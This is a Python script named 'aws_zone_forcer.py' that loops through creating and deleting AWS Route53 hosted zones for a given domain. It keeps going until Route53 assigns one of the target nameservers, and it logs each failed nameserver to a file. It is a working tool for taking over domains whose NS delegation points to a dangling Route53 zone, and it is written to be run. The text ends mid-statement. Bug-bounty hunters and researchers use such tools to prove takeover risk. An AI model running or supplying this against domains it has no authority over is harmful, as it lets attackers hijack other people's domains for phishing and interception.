import sys
import boto3
import signal
import random

class bcolors:
    TITLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    INFO = '\033[93m'
    OKRED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    UNDERLINE = '\033[4m'
    FGWHITE = '\033[37m'
    FAIL = '\033[95m'
    YELLOW = '\033[93m'

def generate_unique_id():
    return hex(random.getrandbits(64))[2:]

def create_dns_zone(domain_name):
    if verbose_mode:
        print(f"{bcolors.OKGREEN}Creating DNS zone for {domain_name}...{bcolors.ENDC}", end='\r')

    client = boto3.client('route53')
    caller_reference = generate_unique_id()
    response = client.create_hosted_zone(
        Name=domain_name,
        CallerReference=caller_reference,
    )
    if verbose_mode:
        print(f"{bcolors.OKGREEN}DNS zone created with ID: {response['HostedZone']['Id']}{bcolors.ENDC}")
    return response['DelegationSet']['NameServers'], response['HostedZone']['Id']

def remove_zone(zone_id):
    if verbose_mode:
        print(f"{bcolors.YELLOW}Removing DNS zone with ID: {zone_id}{bcolors.ENDC}")
    client = boto3.client('route53')
    response = client.delete_hosted_zone(
        Id=zone_id
    )
    if verbose_mode:
        print(f"{bcolors.YELLOW}DNS zone removed.{bcolors.ENDC}")

def compare_ns_records(created_ns, target_ns):
    if verbose_mode:
        print(f"{bcolors.OKGREEN}Comparing NS records...{bcolors.ENDC}")
        print(f"{bcolors.OKGREEN}Created: {','.join(created_ns)}{bcolors.ENDC}")
        print(f"{bcolors.OKGREEN}Target: {','.join(target_ns)}{bcolors.ENDC}")
    
    matching_ns = set(created_ns).intersection(target_ns)
    
    if verbose_mode:
        if matching_ns:
            print(f"{bcolors.OKGREEN}Matching NS record found: {', '.join(matching_ns)}{bcolors.ENDC}")
        else:
            print(f"{bcolors.OKGREEN}No matching NS records found.{bcolors.ENDC}")
    
    return matching_ns

def signal_handler(signal, frame):
    print("\nProgram terminated by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

if len(sys.argv) < 5 or sys.argv[1] != "-d" or sys.argv[3] != "-ns":
    print("Please provide the domain name and the target NS records as arguments.")
    print("Usage: python aws_zone_forcer.py -d <domain_name> -ns <ns1,ns2,...> [--verbose]")
    sys.exit(1)

domain_name = sys.argv[2]
target_ns = sys.argv[4].split(',')
verbose_mode = "--verbose" in sys.argv

matching_ns = None
created_zone_id = None
failed_zones = 0
failed_nameservers = []

try:
    while not matching_ns:
        if verbose_mode:
            print(f"{bcolors.YELLOW}Starting a new iteration...{bcolors.ENDC}")
        
        created_ns, created_zone_id = create_dns_zone(domain_name)
        matching_ns = compare_ns_records(created_ns, target_ns)
        
        if matching_ns:
            if verbose_mode:
                print(f"{bcolors.OKGREEN}Matching NS record found: {', '.join(matching_ns)}{bcolors.ENDC}")
            print(f"{bcolors.INFO}{bcolors.BOLD}Matching NS record found: {', '.join(matching_ns)}{bcolors.ENDC}")
        else:
            failed_zones += 1
            failed_nameservers.extend(created_ns)
            with open("failed_nameservers.txt", "a") as f:
                f.write("\n".join(created_ns) + "\n")
            remove_zone(created_zone_id)
            if verbose_mode:
                print(f"{bcolors.YELLOW}Failed attempt #{failed_zones}. DNS zone removed.{bcolors.ENDC}")
            else:
                sys.stdout.write(f"\r{failed_zones} ")
                sys.stdout.flush()

except KeyboardInterrupt:
    print("\nProgram terminated by user.")
    if created_zone_id:
        remove_zone(created_zone_id)
    sys.exit(0)
except Exception as e:
    print(f"\nAn error occurred: {str(e)}")
    if created_zone_id:
        remove_zone(created_zone_id)
    sys
